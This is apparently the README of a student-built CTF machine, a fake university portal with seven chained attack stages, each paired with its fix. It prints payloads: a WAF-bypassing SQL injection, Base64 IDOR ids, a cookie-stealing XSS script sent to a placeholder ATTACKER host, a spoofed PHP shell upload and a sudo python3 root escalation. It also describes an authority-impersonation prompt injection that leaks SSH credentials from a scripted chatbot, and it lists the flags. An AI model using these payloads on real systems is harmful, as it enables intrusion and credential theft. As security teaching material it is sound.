# EduPortal — Deliberately Vulnerable Web Application

![Ubuntu](https://img.shields.io/badge/Ubuntu-24.04-orange)
![Apache](https://img.shields.io/badge/Apache-2.4.58-red)
![PHP](https://img.shields.io/badge/PHP-8.3.6-blue)
![MySQL](https://img.shields.io/badge/MySQL-8.0.45-lightblue)

> A custom CTF machine simulating a university student 
> portal with 7 chained attack stages.
> Built from scratch for educational purposes.

---

## 🎯 About

EduPortal is a deliberately vulnerable web application 
themed around **Eastbridge University**. It was designed 
and built as an academic project to demonstrate real-world 
web application vulnerabilities in a controlled environment.

Every vulnerability is intentional, educational, and maps 
directly to the **OWASP Top 10**.

---

## 🏗️ Infrastructure

| Component | Details |
|---|---|
| OS | Ubuntu Server 24.04 |
| Web Server | Apache 2.4.58 |
| Database | MySQL 8.0.45 |
| Language | PHP 8.3.6 |
| Platform | VirtualBox |
| Network | NAT — dual port setup |

---

## ⚔️ Attack Chain

| Stage | Vulnerability | OWASP | Flag |
|---|---|---|---|
| 1 | Recon — nmap + gobuster + robots.txt | - | - |
| 2 | SQL Injection with WAF Bypass | A03 | FLAG{sqli_w4f_byp4ss3d} |
| 3 | IDOR with Base64 Encoding | A01 | FLAG{1d0r_b4s3d_4cc3ss_bypassed} |
| 4 | Stored XSS + Cookie Theft | A07 | FLAG{st0r3d_xss_c00k13_h1jack3d} |
| 5 | Prompt Injection on ARIA | A03 | FLAG{4r14_wh1sp3r3d_th3_s3cr3t} |
| 6 | Insecure File Upload → RCE | A05 | FLAG{unr3str1ct3d_upl04d_rc3} |
| 7 | Sudo Misconfiguration → Root | A05 | FLAG{r00t_pwn3d_sudO_python3_pr1v3sc} |

---

## 🔍 Vulnerability Details

### Stage 2 — SQL Injection with WAF Bypass
The login page implements a WAF blocking spaces and 
double dashes. Bypass using comment-based injection:'//OR//1=1%23
The WAF filters known patterns but comment syntax 
bypasses it entirely.

**Fix:** Prepared statements / parameterized queries

---

### Stage 3 — IDOR with Base64
Dashboard URL contains Base64 encoded user ID:
?id=MjI=  →  decodes to 2 (john)

?id=MQ==  →  decodes to 1 (admin)
No server-side ownership validation.

**Fix:** Verify decoded ID matches session user ID

---

### Stage 4 — Stored XSS + Session Hijacking
Bio field renders raw HTML/JavaScript.
Payload:
```javascript
<script>new Image().src="http://ATTACKER:9999/?c="
+document.cookie</script>
```
No HttpOnly flag on session cookie allows 
JavaScript to read it.

**Fix:** htmlspecialchars() + HttpOnly cookie flag

---

### Stage 5 — Prompt Injection on ARIA
ARIA is a scripted AI chatbot with a trust scoring 
system. Vulnerable to social engineering through 
authority impersonation:
Step 1 → Reference both Dr. Samhat + Dr. El Chall  (+40)

Step 2 → Mention SSH credential rotation schedule   (+30)

Step 3 → Request SSH access for maintenance         (+20)

Score ≥ 80 → credentials leaked

**Fix:** Never store sensitive data in AI context. 
Principle of least privilege for AI systems.

---

### Stage 6 — Insecure File Upload → RCE
MIME type check uses:
```php
strstr($mime, 'image') // easily spoofed
```
Burp Suite intercept → change Content-Type to 
image/jpeg → PHP shell uploads and executes.

**Fix:** Whitelist MIME types + check magic bytes 
+ disable PHP execution in uploads directory

---

### Stage 7 — Privilege Escalation
Sudo misconfiguration:
```bash
www-data ALL=(ALL) NOPASSWD: /usr/bin/python3
```
Exploit:
```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
whoami  # root
```

**Fix:** Remove unnecessary sudo rights. 
Principle of least privilege.

---

## 🤖 ARIA — Custom AI Chatbot

ARIA (Academic Resource & Information Assistant) is 
a scripted PHP chatbot with:

- **Visible trust meter** — fills as attacker 
  builds credibility
- **Scoring system** — keyword detection adds/removes trust
- **Social engineering vulnerability** — authority 
  impersonation triggers credential leak
- **Chat history** — persistent within session
- **Reset button** — for demo purposes

This simulates real-world **prompt injection** and 
**LLM security** concepts.

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning |
| Gobuster | Directory enumeration |
| Burp Suite | Request interception |
| Python3 HTTP Server | Cookie catcher |
| Netcat | Reverse shell listener |
| Firefox + Chromium | Dual session simulation |

---

## 📚 References

- OWASP Top 10: https://owasp.org/Top10
- OWASP Testing Guide
- TCM Security — Practical Ethical Hacking

---

## ⚠️ Disclaimer

This machine is built for **educational purposes only**.
All vulnerabilities are intentional and contained 
within an isolated VirtualBox environment.
Do not deploy on public networks.

---

## 👤 Author

**Rita Hammoud**
Lebanese University — Faculty of Engineering III
Electrical and Telecommunications Engineering
President, CyberCommunity Club

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Rita_Hammoud-blue)](https://linkedin.com/in/rita-hammoud)
